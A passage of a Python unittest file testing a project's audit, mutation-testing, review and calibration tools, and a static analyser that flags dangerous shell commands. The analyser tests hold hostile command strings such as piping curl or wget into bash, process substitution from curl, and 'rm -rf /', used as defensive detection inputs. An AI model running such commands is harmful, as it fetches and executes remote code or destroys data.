    def test_decisiones_adr_propuesto(self):
        self._write("adr/ADR-999-x.md", "---\nid: ADR-999\nestado: Propuesto\n---\n# x\n")
        (self.tmp / "req").mkdir()
        warns = aa.auditar_decisiones(req_dir=self.tmp / "req", adr_dir=self.tmp / "adr")
        self.assertTrue(any("ADR-999" in w and "Propuesto" in w for w in warns))

    def test_tests_tautologia_es_error(self):
        test = self._write(
            "t.py",
            "import unittest\n\n\nclass T(unittest.TestCase):\n"
            "    def test_x(self):\n        self.assertTrue(True)\n",
        )
        scripts = self.tmp / "scripts"
        scripts.mkdir()
        errors, _ = aa.auditar_tests(test_file=test, scripts_dir=scripts)
        self.assertTrue(any("tautologica" in e for e in errors))

    def test_tests_sin_asercion_alerta(self):
        test = self._write(
            "t.py",
            "import unittest\n\n\nclass T(unittest.TestCase):\n"
            "    def test_y(self):\n        x = 1 + 1\n",
        )
        scripts = self.tmp / "scripts"
        scripts.mkdir()
        _, warnings = aa.auditar_tests(test_file=test, scripts_dir=scripts)
        self.assertTrue(any("sin asercion" in w for w in warnings))

    def test_except_pass_es_error(self):
        test = self._write("t.py", self._TEST_OK)
        self._write("scripts/z.py", "def f():\n    try:\n        x = 1\n    except Exception:\n        pass\n")
        errors, _ = aa.auditar_tests(test_file=test, scripts_dir=self.tmp / "scripts")
        self.assertTrue(any("except con 'pass'" in e for e in errors))

    def test_trailer_asistido(self):
        self.assertTrue(aa._tiene_trailer("Assisted-by: opencode"))
        self.assertTrue(aa._tiene_trailer("Generated-by: x"))
        self.assertFalse(aa._tiene_trailer("commit normal sin trailer"))

    def test_repo_real_sin_errores_de_tests(self):
        errors, _ = aa.auditar_tests()
        self.assertEqual(errors, [])

    def test_vulns_con_fix(self):
        req = self._write("requirements.txt", "x\n")
        hallazgos = [{"name": "x", "version": "1.0", "id": "CVE-1", "fix_versions": ["1.1"]}]
        errors, warnings = aa.auditar_vulns(requirements=req, ejecutar=lambda: hallazgos)
        self.assertEqual(errors, [])
        self.assertTrue(any("CVE-1" in w and "fix: 1.1" in w for w in warnings))

    def test_vulns_sin_parche(self):
        req = self._write("requirements.txt", "x\n")
        hallazgos = [{"name": "x", "version": "1.0", "id": "CVE-2", "fix_versions": []}]
        _, warnings = aa.auditar_vulns(requirements=req, ejecutar=lambda: hallazgos)
        self.assertTrue(any("sin parche" in w for w in warnings))

    def test_vulns_dedupe(self):
        req = self._write("requirements.txt", "x\n")
        dup = {"name": "x", "version": "1.0", "id": "CVE-3", "fix_versions": []}
        _, warnings = aa.auditar_vulns(requirements=req, ejecutar=lambda: [dup, dict(dup)])
        self.assertEqual(len(warnings), 1)

    def test_vulns_sin_escaner(self):
        req = self._write("requirements.txt", "x\n")
        with mock.patch.object(aa, "_scanner_disponible", return_value=(None, None)):
            errors, warnings = aa.auditar_vulns(requirements=req)
        self.assertEqual(errors, [])
        self.assertTrue(any("sin escaner" in w for w in warnings))

    def test_vulns_archivo_inexistente(self):
        errors, _ = aa.auditar_vulns(requirements=self.tmp / "no_existe.txt")
        self.assertTrue(any("no existe" in e for e in errors))

    def test_vulns_fallo_scanner(self):
        def falla():
            raise RuntimeError("boom")

        req = self._write("requirements.txt", "x\n")
        errors, _ = aa.auditar_vulns(requirements=req, ejecutar=falla)
        self.assertTrue(any("fallo el escaneo" in e for e in errors))

    def test_calibracion_set_valido(self):
        errors, _ = aa.auditar_calibracion()
        self.assertEqual(errors, [])

    def test_calibracion_duplicado_es_error(self):
        s = self._write("s.json", json.dumps({"casos": [
            {"id": "N01", "tipo": "noul", "estado": "e", "instrucciones": "i", "esperado": "yes"},
            {"id": "N01", "tipo": "noul", "estado": "otro", "instrucciones": "i", "esperado": "no"},
        ]}))
        c = self._write("c.json", json.dumps({"casos": []}))
        errors, _ = aa.auditar_calibracion(s, c)
        self.assertTrue(any("duplicado" in e for e in errors))

    def test_main_all_en_verde(self):
        self.assertEqual(aa.main(["all"]), 0)


class TestMutationCheck(unittest.TestCase):
    """REQ-015: generacion de mutantes y agregacion del chequeo."""

    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp())

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def test_descripciones_mutantes(self):
        descs = mc.descripciones_mutantes("def f(a, b):\n    return a == b\n")
        self.assertEqual(len(descs), 1)
        self.assertIn("comparador", descs[0])

    def test_mutante_cambia_comparador(self):
        mutantes = mc.generar_mutantes("def f(a, b):\n    return a == b\n")
        self.assertEqual(len(mutantes), 1)
        self.assertIn("!=", mutantes[0][1])

    def test_mutante_booleano(self):
        mutantes = mc.generar_mutantes("FLAG = True\n")
        self.assertTrue(any("False" in codigo for _, codigo in mutantes))

    def test_mutante_operador_logico(self):
        mutantes = mc.generar_mutantes("def f(a, b):\n    return a and b\n")
        self.assertTrue(any(" or " in codigo for _, codigo in mutantes))

    def test_mutantes_sintacticamente_validos(self):
        source = "def f(a, b):\n    return a == b and True\n"
        for _, codigo in mc.generar_mutantes(source):
            self.assertIsNotNone(ast.parse(codigo))

    def test_medir_agrega_y_restaura(self):
        scripts = self.tmp / "scripts"
        scripts.mkdir()
        modulo = scripts / "foo.py"
        original = "def f(a, b):\n    return a == b\n"
        modulo.write_text(original, encoding="utf-8")
        resultado = mc.medir(self.tmp, "scripts/foo.py", "test_x", ejecutar=lambda desc: 0)
        self.assertEqual(resultado["total"], 1)
        self.assertEqual(resultado["mutantes_muertos"], 0)
        self.assertEqual(modulo.read_text(encoding="utf-8"), original)

    def test_medir_mutante_muerto(self):
        scripts = self.tmp / "scripts"
        scripts.mkdir()
        (scripts / "foo.py").write_text("def f(a, b):\n    return a == b\n", encoding="utf-8")
        resultado = mc.medir(self.tmp, "scripts/foo.py", "test_x", ejecutar=lambda desc: 1)
        self.assertEqual(resultado["score"], 1.0)

    def test_repo_score_sobre_umbral(self):
        # Chequeo real acotado sobre una copia temporal (no toca el repo).
        copia = mc._copia_temporal(ROOT)
        try:
            resultado = mc.medir(
                copia, "scripts/adr_validator.py",
                "test_ecosistema.TestADRValidator", max_mutantes=8,
            )
        finally:
            shutil.rmtree(copia, ignore_errors=True)
        self.assertGreaterEqual(resultado["score"], 0.8)

    def test_medir_batch_agrega_y_pondera(self):
        scripts = self.tmp / "scripts"
        scripts.mkdir()
        (scripts / "uno.py").write_text("def f(a, b):\n    return a == b\n", encoding="utf-8")
        (scripts / "dos.py").write_text("def g(a, b):\n    return a and b\n", encoding="utf-8")
        pares = [("scripts/uno.py", "test_x"), ("scripts/dos.py", "test_y")]
        resultado = mc.medir_batch(self.tmp, pares=pares, ejecutar=lambda desc: 1)
        self.assertEqual(resultado["total"], 2)
        self.assertEqual(resultado["mutantes_muertos"], 2)
        self.assertEqual(resultado["score"], 1.0)
        self.assertEqual(len(resultado["batch"]), 2)

    def test_medir_batch_score_parcial(self):
        scripts = self.tmp / "scripts"
        scripts.mkdir()
        (scripts / "uno.py").write_text("def f(a, b):\n    return a == b\n", encoding="utf-8")
        (scripts / "dos.py").write_text("def g(a, b):\n    return a and b\n", encoding="utf-8")
        pares = [("scripts/uno.py", "test_x"), ("scripts/dos.py", "test_y")]
        llamadas = {"n": 0}

        def ejecutar(desc):
            llamadas["n"] += 1
            return 1 if llamadas["n"] == 1 else 0

        resultado = mc.medir_batch(self.tmp, pares=pares, ejecutar=ejecutar)
        self.assertEqual(resultado["score"], 0.5)

    def test_medir_batch_sin_mutantes_score_1(self):
        scripts = self.tmp / "scripts"
        scripts.mkdir()
        (scripts / "vacio.py").write_text("x = 1\n", encoding="utf-8")
        resultado = mc.medir_batch(self.tmp, pares=[("scripts/vacio.py", "test_x")])
        self.assertEqual(resultado["total"], 0)
        self.assertEqual(resultado["score"], 1.0)

    def test_main_batch_imprime_tabla(self):
        res = {
            "batch": [{"modulo": "scripts/x.py", "test": "t", "total": 2,
                       "mutantes_muertos": 2, "sobrevivientes": [], "score": 1.0}],
            "total": 2, "mutantes_muertos": 2, "score": 1.0,
        }
        with mock.patch.object(mc, "medir_batch", return_value=res), \
                mock.patch.object(sys, "stdout", io.StringIO()) as out:
            rc = mc.main(["--batch", "--in-place"])
        self.assertEqual(rc, 0)
        self.assertIn("Batch: 2/2", out.getvalue())

    def test_main_batch_strict_falla_bajo_umbral(self):
        res = {"batch": [], "total": 4, "mutantes_muertos": 2, "score": 0.5}
        with mock.patch.object(mc, "medir_batch", return_value=res), \
                mock.patch.object(sys, "stdout", io.StringIO()), \
                mock.patch.object(sys, "stderr", io.StringIO()):
            rc = mc.main(["--batch", "--in-place", "--strict", "--umbral", "0.8"])
        self.assertEqual(rc, 1)

    def test_all_batch_incluye_default_y_excluye_mutation(self):
        modulos = {modulo for modulo, _ in mc.ALL_BATCH}
        self.assertTrue({modulo for modulo, _ in mc.DEFAULT_BATCH} <= modulos)
        self.assertNotIn("scripts/mutation_check.py", modulos)

    def test_main_all_usa_all_batch(self):
        res = {"batch": [], "total": 2, "mutantes_muertos": 2, "score": 1.0}
        with mock.patch.object(mc, "medir_batch", return_value=res) as mb, \
                mock.patch.object(sys, "stdout", io.StringIO()):
            rc = mc.main(["--all", "--in-place"])
        self.assertEqual(rc, 0)
        self.assertEqual(mb.call_args.args[1], mc.ALL_BATCH)


class TestJevReview(unittest.TestCase):
    """REQ-016: revision humana asistida de clasificaciones Jev (UI/report)."""

    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp())

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def test_construir_items_requisitos(self):
        items = jr.construir_items(["requisitos"], limit=3)
        self.assertEqual(len(items), 3)
        self.assertTrue(all(i["pilar"] == "requisitos" for i in items))
        self.assertTrue(all(i["id"].startswith("REQ-") for i in items))

    def test_construir_items_lecciones(self):
        items = jr.construir_items(["lecciones"], limit=2)
        self.assertTrue(all(i["pilar"] == "lecciones" for i in items))

    def test_clasificar_con_cliente_falso(self):
        items = [{"pilar": "requisitos", "id": "REQ-999", "texto": "texto"}]
        filas = jr.clasificar(items, jr._ClienteFalso(), {"choice": 0.9})
        self.assertEqual(len(filas), 1)
        fila = filas[0]
        self.assertEqual(fila["campo"], "prioridad")
        self.assertIn(fila["propuesta"], fila["opciones"])
        self.assertEqual(fila["estado"], "pendiente")

    def test_aplicar_decisiones(self):
        fila = {"propuesta": "Alta", "estado": "pendiente", "decision_final": None}
        jr.aplicar_decision(fila, "y")
        self.assertEqual((fila["estado"], fila["decision_final"]), ("ok", "Alta"))
        fila2 = {"propuesta": "Alta", "estado": "pendiente", "decision_final": None}
        jr.aplicar_decision(fila2, "n", "Baja")
        self.assertEqual((fila2["estado"], fila2["decision_final"]), ("corregir", "Baja"))
        fila3 = {"propuesta": "Alta", "estado": "pendiente", "decision_final": None}
        jr.aplicar_decision(fila3, "s")
        self.assertEqual((fila3["estado"], fila3["decision_final"]), ("saltar", None))

    def test_guardar_revision(self):
        filas = [
            {"estado": "ok"}, {"estado": "corregir"}, {"estado": "pendiente"}, {"estado": "saltar"}
        ]
        path = self.tmp / "rev.json"
        jr.guardar_revision(filas, path)
        data = json.loads(path.read_text(encoding="utf-8"))
        self.assertEqual(data["total"], 4)
        self.assertEqual(data["ok"], 1)
        self.assertEqual(data["corregir"], 1)
        self.assertEqual(data["pendiente"], 1)
        self.assertEqual(data["saltar"], 1)

    def test_main_report_fake(self):
        out = self.tmp / "rev.json"
        os.environ["JEV_REVIEW_REPORT"] = str(out)
        os.environ["JEV_REVIEW_CACHE"] = str(self.tmp / "cache.json")
        try:
            self.assertEqual(jr.main(["--report", "--fake", "--limit", "2"]), 0)
            self.assertTrue(out.exists())
        finally:
            os.environ.pop("JEV_REVIEW_REPORT", None)
            os.environ.pop("JEV_REVIEW_CACHE", None)
        self.assertNotIn(".docs/requirements", str(out))  # no escribe en los documentos

    def test_cache_evita_recalcular(self):
        llamadas = {"n": 0}

        class _Contador(jr._ClienteFalso):
            def decide(self, state, questions):
                llamadas["n"] += 1
                return super().decide(state, questions)

        item = {"pilar": "requisitos", "id": "REQ-999", "texto": "texto"}
        cache: dict = {}
        primera = jr.filas_de_item(item, _Contador(), {"choice": 0.9}, cache)
        segunda = jr.filas_de_item(item, _Contador(), {"choice": 0.9}, cache)
        self.assertEqual(llamadas["n"], 1)
        self.assertEqual(primera[0]["propuesta"], segunda[0]["propuesta"])

    def test_clave_cache_estable(self):
        a = {"pilar": "lecciones", "id": "LSN-1", "texto": "mismo"}
        b = {"pilar": "lecciones", "id": "LSN-1", "texto": "mismo"}
        self.assertEqual(jr._clave(a), jr._clave(b))

    def test_cache_roundtrip(self):
        path = self.tmp / "cache.json"
        jr.guardar_cache({"k": [{"campo": "prioridad"}]}, str(path))
        self.assertEqual(jr.cargar_cache(str(path))["k"][0]["campo"], "prioridad")
        self.assertEqual(jr.cargar_cache(str(self.tmp / "no.json")), {})

    def test_construir_items_calibracion(self):
        items = jr.construir_items(["calibracion"], limit=2, calibracion=True)
        self.assertEqual(len(items), 2)
        self.assertTrue(all("caso" in i and i["pilar"] == "calibracion" for i in items))

    def test_filas_calibracion_no_usa_modelo(self):
        items = jr.construir_items(["calibracion"], limit=1, calibracion=True)
        filas = jr.filas_de_item(items[0], client=None, accuracy={})
        self.assertEqual(filas[0]["propuesta"], str(items[0]["caso"]["esperado"]))
        self.assertIsNone(filas[0]["confianza"])
        self.assertTrue(filas[0]["opciones"])

    def test_main_calibracion_report(self):
        out = self.tmp / "cal.json"
        os.environ["JEV_REVIEW_REPORT"] = str(out)
        os.environ["JEV_REVIEW_CACHE"] = str(self.tmp / "cache.json")
        try:
            self.assertEqual(jr.main(["--calibracion", "--report", "--limit", "3"]), 0)
            self.assertTrue(out.exists())
        finally:
            os.environ.pop("JEV_REVIEW_REPORT", None)
            os.environ.pop("JEV_REVIEW_CACHE", None)


class TestDiagnostico(unittest.TestCase):
    """REQ-017: diagnostico de los cuatro pilares en proyectos externos."""

    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp())

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def test_repo_real_solido(self):
        reporte = diag.evaluar(ROOT)
        nombres = [p["pilar"] for p in reporte["pilares"]]
        self.assertEqual(nombres, ["requisitos", "conocimiento", "lecciones", "pilar4", "higiene"])
        self.assertGreaterEqual(reporte["puntuacion_global"], 80)

    def test_dir_vacio_ausente_con_sugerencias(self):
        reporte = diag.evaluar(self.tmp)
        self.assertEqual(reporte["puntuacion_global"], 0)
        self.assertTrue(reporte["sugerencias"])

    def test_no_escribe_en_el_objetivo(self):
        (self.tmp / "README.md").write_text("# x\n", encoding="utf-8")
        antes = sorted(p.name for p in self.tmp.rglob("*"))
        diag.evaluar(self.tmp)
        despues = sorted(p.name for p in self.tmp.rglob("*"))
        self.assertEqual(antes, despues)

    def test_min_score(self):
        self.assertEqual(diag.main(["--root", str(self.tmp), "--min-score", "50"]), 1)
        self.assertEqual(diag.main(["--root", str(self.tmp)]), 0)

    def test_dir_inexistente(self):
        self.assertEqual(diag.main(["--root", str(self.tmp / "no_existe")]), 1)


class TestJevCalibrationMerge(unittest.TestCase):
    """REQ-018: fusion idempotente de candidatos aprobados en el set."""

    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp())
        self.set_path = self.tmp / "set.json"
        self.cand_path = self.tmp / "cand.json"
        self.set_path.write_text(json.dumps({
            "version": 2,
            "casos": [{"id": "N01", "tipo": "noul", "esperado": "yes"}],
        }), encoding="utf-8")

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def _cand(self, estado="aprobado", casos=None):
        self.cand_path.write_text(json.dumps({
            "estado": estado,
            "casos": casos if casos is not None else [
                {"id": "N99", "tipo": "noul", "estado": "e", "instrucciones": "i", "esperado": "yes"},
                {"id": "C99", "tipo": "choice", "estado": "e", "instrucciones": "i",
                 "criterios": {"requisitos": "x", "verificacion": "y"}, "esperado": "requisitos"},
            ],
        }), encoding="utf-8")

    def test_dry_run_no_escribe(self):
        self._cand()
        antes = self.set_path.read_text(encoding="utf-8")
        set_data = jcm._leer(self.set_path)
        resultado = jcm.fusionar(set_data, jcm._leer(self.cand_path), aplicar=False)
        self.assertEqual(len(resultado["nuevos"]), 2)
        self.assertEqual(set_data["version"], 2)
        self.assertEqual(self.set_path.read_text(encoding="utf-8"), antes)

    def test_aplicar_fusiona_y_subversiona(self):
        self._cand()
        set_data = jcm._leer(self.set_path)
        resultado = jcm.fusionar(set_data, jcm._leer(self.cand_path), aplicar=True)
        self.assertEqual(resultado["errores"], [])
        self.assertEqual(set_data["version"], 3)
        self.assertEqual([c["id"] for c in set_data["casos"]], ["N01", "N99", "C99"])
        self.assertEqual(len(set_data["revision_humana"]["lotes_fusionados"]), 1)

    def test_duplicado_es_error(self):
        self._cand(casos=[{"id": "N01", "tipo": "noul", "estado": "e", "instrucciones": "i", "esperado": "yes"}])
        resultado = jcm.fusionar(jcm._leer(self.set_path), jcm._leer(self.cand_path), aplicar=True)
        self.assertTrue(any("duplicado" in e for e in resultado["errores"]))

    def test_no_aprobado_es_error_salvo_forzar(self):
        self._cand(estado="pendiente_revision")
        error = jcm.fusionar(jcm._leer(self.set_path), jcm._leer(self.cand_path))
        self.assertTrue(any("no estan aprobados" in e for e in error["errores"]))
        forzado = jcm.fusionar(jcm._leer(self.set_path), jcm._leer(self.cand_path), forzar=True)
        self.assertEqual(forzado["errores"], [])

    def test_main_dry_run(self):
        self._cand()
        self.assertEqual(jcm.main(["--set", str(self.set_path), "--candidatos", str(self.cand_path)]), 0)
        self.assertEqual(self.set_path.read_text(encoding="utf-8").count('"version": 2'), 1)

    def test_caso_invalido_es_error(self):
        self._cand(casos=[{"id": "X1", "tipo": "noul", "estado": "e", "instrucciones": "i", "esperado": "quizas"}])
        resultado = jcm.fusionar(jcm._leer(self.set_path), jcm._leer(self.cand_path), aplicar=True)
        self.assertTrue(any("esperado invalido" in e for e in resultado["errores"]))

    def test_score_invalido_es_error(self):
        self._cand(casos=[{"id": "X2", "tipo": "score", "estado": "e", "instrucciones": "i",
                            "niveles": ["a", "b"], "esperado": 9}])
        resultado = jcm.fusionar(jcm._leer(self.set_path), jcm._leer(self.cand_path), aplicar=True)
        self.assertTrue(any("fuera de niveles" in e for e in resultado["errores"]))

    def test_escenario_duplicado_advertencia(self):
        self._cand(casos=[
            {"id": "N98", "tipo": "noul", "estado": "e", "instrucciones": "i", "esperado": "yes"},
            {"id": "N97", "tipo": "noul", "estado": "e", "instrucciones": "i", "esperado": "no"},
        ])
        resultado = jcm.fusionar(jcm._leer(self.set_path), jcm._leer(self.cand_path), aplicar=True)
        self.assertTrue(any("escenario duplicado" in a for a in resultado["advertencias"]))

    def test_choice_sin_criterios_es_error(self):
        self._cand(casos=[{"id": "X3", "tipo": "choice", "estado": "e", "instrucciones": "i",
                            "criterios": {}, "esperado": "requisitos"}])
        resultado = jcm.fusionar(jcm._leer(self.set_path), jcm._leer(self.cand_path))
        self.assertTrue(any("choice sin 'criterios'" in e for e in resultado["errores"]))

    def test_score_sin_niveles_es_error(self):
        self._cand(casos=[{"id": "X4", "tipo": "score", "estado": "e", "instrucciones": "i",
                            "niveles": [], "esperado": 0}])
        resultado = jcm.fusionar(jcm._leer(self.set_path), jcm._leer(self.cand_path))
        self.assertTrue(any("score sin 'niveles'" in e for e in resultado["errores"]))

    def test_escenarios_distintos_sin_advertencia(self):
        self._cand(casos=[
            {"id": "N96", "tipo": "noul", "estado": "uno", "instrucciones": "i", "esperado": "yes"},
            {"id": "N95", "tipo": "noul", "estado": "dos", "instrucciones": "i", "esperado": "no"},
        ])
        resultado = jcm.fusionar(jcm._leer(self.set_path), jcm._leer(self.cand_path))
        self.assertEqual(resultado["advertencias"], [])

    def test_ids_unicos_sin_error(self):
        self._cand(casos=[
            {"id": "N94", "tipo": "noul", "estado": "a", "instrucciones": "i", "esperado": "yes"},
            {"id": "N93", "tipo": "noul", "estado": "b", "instrucciones": "i", "esperado": "no"},
        ])
        resultado = jcm.fusionar(jcm._leer(self.set_path), jcm._leer(self.cand_path))
        self.assertEqual(resultado["errores"], [])

    def test_main_json_aplicar_conserva_acentos(self):
        self._cand(casos=[{"id": "N91", "tipo": "noul", "estado": "situación",
                            "instrucciones": "i", "esperado": "yes"}])
        with mock.patch.object(sys, "stdout", io.StringIO()):
            rc = jcm.main(["--set", str(self.set_path), "--candidatos", str(self.cand_path),
                           "--aplicar", "--json"])
        self.assertEqual(rc, 0)
        self.assertIn("situación", self.set_path.read_text(encoding="utf-8"))


class TestAnalyzeShell(unittest.TestCase):
    """Cubre el analisis estatico de comandos shell (P0.8)."""

    def test_comando_seguro_sin_hallazgos(self):
        self.assertEqual(ash.analyze("echo hola"), [])
        self.assertEqual(ash.analyze("cat /tmp/archivo.txt"), [])

    def test_pipe_descargador_a_shell(self):
        for cmd in ("curl http://x | bash", "wget http://x -O- | sh"):
            hallazgos = ash.analyze(cmd)
            self.assertTrue(any("dangerous-pipe" in h for h in hallazgos), cmd)

    def test_eval_like(self):
        self.assertTrue(any("eval-like" in h for h in ash.analyze("eval foo")))

    def test_rm_rf_directo(self):
        self.assertTrue(any("rm-rf" in h for h in ash.analyze("rm -rf /tmp/x")))

    def test_bash_c_destructivo(self):
        self.assertTrue(any("rm-rf" in h for h in ash.analyze("bash -c 'rm -rf /'")))

    def test_subcomando_encadenado(self):
        self.assertTrue(any("git-reset-hard" in h for h in ash.analyze("ls && git reset --hard")))

    def test_tokenize_y_split(self):
        self.assertEqual(len(ash.split_into_commands(ash.tokenize("a | b && c"))), 2)

    def test_tokenizacion_invalida_eleva_error(self):
        with self.assertRaises(ValueError):
            ash.analyze("echo 'sin cerrar")

    def test_helpers_downloader_shell_eval(self):
        self.assertTrue(ash.is_downloader(["/usr/bin/curl", "x"]))
        self.assertFalse(ash.is_downloader([], 0))
        self.assertFalse(ash.is_downloader(["x"], 5))
        self.assertTrue(ash.has_downloader(["ls", "wget"]))
        self.assertTrue(ash.is_shell(["/bin/bash"]))
        self.assertTrue(ash.is_shell(["sudo", "bash"]))
        self.assertFalse(ash.is_shell(["echo"]))
        self.assertTrue(ash.is_eval_like(["source"]))
        self.assertFalse(ash.is_eval_like([], 0))

    def test_find_shell_con_sudo(self):
        self.assertEqual(ash.find_shell(["sudo", "-S", "bash"]), 2)
        self.assertEqual(ash.find_shell(["sudo"]), -1)
        self.assertEqual(ash.find_shell(["echo", "hi"]), -1)

    def test_extract_substitution(self):
        self.assertEqual(ash._extract_substitution("$(curl x)"), ["curl x"])
        self.assertEqual(ash._extract_substitution("`curl x`"), ["curl x"])
        self.assertEqual(ash._extract_substitution("nada"), [])

    def test_extract_command_substitutions_dos_formas(self):
        self.assertEqual(ash._extract_command_substitutions(["$(curl x)"]), ["curl x"])
        self.assertEqual(
            ash._extract_command_substitutions(["$", "(", "curl", "x", ")"]), ["curl x"]
        )
        self.assertEqual(
            ash._extract_command_substitutions(["$", "(", "$", "(", "a", ")", ")"]),
            ["$ ( a )"],
        )

    def test_extract_process_substitutions(self):
        self.assertEqual(
            ash._extract_process_substitutions(["<(", "curl", "x", ")"]), ["curl x"]
        )
        self.assertEqual(ash._extract_process_substitutions(["nada"]), [])

    def test_extract_backtick_blocks(self):
        self.assertEqual(ash._extract_backtick_blocks(["`curl x`"]), ["curl x"])
        self.assertIn("curl", ash._extract_backtick_blocks(["`", "curl", "x", "`"])[0])

    def test_extract_bash_c_content(self):
        self.assertEqual(ash._extract_bash_c_content(["bash", "-c", "rm -rf /"]), ["rm -rf /"])
        self.assertEqual(ash._extract_bash_c_content(["bash", "-c"]), [])
        self.assertEqual(ash._extract_bash_c_content(["echo", "hi"]), [])
        self.assertEqual(ash._extract_bash_c_content([]), [])

    def test_stage_y_pipeline_vacios(self):
        self.assertEqual(ash.analyze_stage([]), set())
        self.assertEqual(ash.analyze_pipeline([]), set())

    def test_analyze_process_substitution(self):
        hallazgos = ash.analyze("bash <(curl http://x)")
        self.assertTrue(any("process-substitution" in h for h in hallazgos))

    def test_analyze_pipe_backtick(self):
        hallazgos = ash.analyze("`curl http://x` | sh")
        self.assertTrue(any("dangerous-pipe-backtick" in h for h in hallazgos))

    def test_analyze_command_substitution_y_backtick(self):
        self.assertIsInstance(ash.analyze("echo $(curl http://x)"), list)
        self.assertIsInstance(ash.analyze("echo `curl http://x`"), list)

    def test_cli_main(self):
        script = str(SCRIPTS / "analyze_shell.py")
        ok = subprocess.run([sys.executable, script, "echo hola"],
                            capture_output=True, text=True, timeout=30)
        self.assertEqual(ok.returncode, 0)
        bad = subprocess.run([sys.executable, script, "rm -rf /tmp/x"],
                            capture_output=True, text=True, timeout=30)
        self.assertEqual(bad.returncode, 1)
        uso = subprocess.run([sys.executable, script], capture_output=True, text=True, timeout=30)
        self.assertEqual(uso.returncode, 1)

    def test_tokenize_punctuation_chars(self):
        # Verifica que punctuation_chars=True afecta la tokenizacion
        # Con punctuation_chars=True, los operadores se separan
        tokens = ash.tokenize("a|b")
        self.assertEqual(tokens, ["a", "|", "b"])
        tokens = ash.tokenize("a&&b")
        self.assertEqual(tokens, ["a", "&&", "b"])

    def test_split_into_commands_has_content_branches(self):
        # has_content = True cuando hay tokens antes de ;/&&/||
        cmds = ash.split_into_commands(ash.tokenize("a && b"))
        self.assertEqual(len(cmds), 2)
        self.assertEqual(cmds[0], [["a"]])
        self.assertEqual(cmds[1], [["b"]])

        # has_content = False al inicio y despues de ;
        cmds = ash.split_into_commands(ash.tokenize("; a"))
        self.assertEqual(len(cmds), 1)
        self.assertEqual(cmds[0], [["a"]])

        # Pipeline: has_content = True al ver |
        cmds = ash.split_into_commands(ash.tokenize("a | b"))
        self.assertEqual(len(cmds), 1)
        self.assertEqual(cmds[0], [["a"], ["b"]])

        # Comando vacio al final
        cmds = ash.split_into_commands(ash.tokenize("a ;"))
        self.assertEqual(len(cmds), 1)
        self.assertEqual(cmds[0], [["a"]])

    def test_find_shell_sudo_comparison(self):
        # _basename(tokens[i]) == SUDO en linea 130
        self.assertEqual(ash.find_shell(["sudo", "bash"]), 1)
        self.assertEqual(ash.find_shell(["/usr/bin/sudo", "bash"]), 1)
        self.assertEqual(ash.find_shell(["sudo", "-S", "bash"]), 2)
        self.assertEqual(ash.find_shell(["sudo", "-u", "user", "bash"]), 3)
        # sudo sin shell despues
        self.assertEqual(ash.find_shell(["sudo"]), -1)
        self.assertEqual(ash.find_shell(["sudo", "echo"]), -1)

    def test_basename_edge_cases(self):
        # _basename maneja comillas y rutas
        self.assertEqual(ash._basename("'bash'"), "bash")
        self.assertEqual(ash._basename('"bash"'), "bash")
        self.assertEqual(ash._basename("/usr/bin/bash"), "bash")
        self.assertEqual(ash._basename("bash"), "bash")
        self.assertEqual(ash._basename("'sudo'"), "sudo")

    def test_is_downloader_edge_cases(self):
        # is_downloader con index fuera de rango
        self.assertFalse(ash.is_downloader([], 0))
        self.assertFalse(ash.is_downloader(["curl"], 5))
        # is_downloader con ruta completa
        self.assertTrue(ash.is_downloader(["/usr/bin/curl", "x"]))
        self.assertTrue(ash.is_downloader(["/usr/bin/wget", "x"]))

    def test_has_downloader_edge_cases(self):
        self.assertFalse(ash.has_downloader([]))
        self.assertTrue(ash.has_downloader(["ls", "curl"]))
        self.assertTrue(ash.has_downloader(["wget", "x"]))

    def test_is_shell_edge_cases(self):
        self.assertFalse(ash.is_shell([], 0))
        self.assertFalse(ash.is_shell(["echo"], 0))
        self.assertTrue(ash.is_shell(["bash"], 0))
        self.assertTrue(ash.is_shell(["/bin/bash"], 0))
        self.assertTrue(ash.is_shell(["sudo", "bash"], 0))
        self.assertFalse(ash.is_shell(["sudo", "echo"], 0))

    def test_is_eval_like_edge_cases(self):
        self.assertFalse(ash.is_eval_like([], 0))
        self.assertFalse(ash.is_eval_like(["echo"], 0))
        self.assertTrue(ash.is_eval_like(["eval"], 0))
        self.assertTrue(ash.is_eval_like(["exec"], 0))
        self.assertTrue(ash.is_eval_like(["source"], 0))
        self.assertTrue(ash.is_eval_like(["."], 0))

    def test_extract_command_substitutions_nested(self):
        # Command substitution anidada
        result = ash._extract_command_substitutions(["$", "(", "$", "(", "a", ")", ")", "b"])
        self.assertEqual(result, ["$ ( a )"])

    def test_extract_process_substitutions_nested(self):
        # Process substitution anidada
        result = ash._extract_process_substitutions(["<(", "<(", "a", ")", ")", "b"])
        self.assertEqual(result, ["<( a )"])

    def test_extract_backtick_blocks_multiple(self):
        # Multiples bloques backtick
        result = ash._extract_backtick_blocks(["`a`", "`b`"])
        self.assertEqual(len(result), 2)
        self.assertIn("a", result[0])
        self.assertIn("b", result[1])

    def test_extract_bash_c_content_edge_cases(self):
        # bash -c con multiples argumentos
        self.assertEqual(ash._extract_bash_c_content(["bash", "-c", "echo hi", "extra"]), ["echo hi"])
        # sh -c
        self.assertEqual(ash._extract_bash_c_content(["sh", "-c", "ls"]), ["ls"])
        # zsh -c
        self.assertEqual(ash._extract_bash_c_content(["zsh", "-c", "pwd"]), ["pwd"])

    def test_check_dangerous_subcommand_variants(self):
        # Verifica que los patrones detectan variantes
        findings = ash.check_dangerous_subcommand("rm -rf /tmp/x")
        self.assertTrue(any("rm-rf" in f for f in findings))
        findings = ash.check_dangerous_subcommand("RM -RF /tmp/x")
        self.assertTrue(any("rm-rf" in f for f in findings))
        findings = ash.check_dangerous_subcommand("git reset --hard HEAD")
        self.assertTrue(any("git-reset-hard" in f for f in findings))
        findings = ash.check_dangerous_subcommand("docker compose down -v")
        self.assertTrue(any("docker-compose-down-v" in f for f in findings))

    def test_analyze_stage_recursive(self):
        # analyze_stage llama a analyze recursivamente para substitutions
        findings = ash.analyze_stage(["echo", "$(rm -rf /)"])
        self.assertTrue(any("rm-rf" in f for f in findings))

    def test_analyze_pipeline_multiple_stages(self):
        # Pipeline con multiples etapas
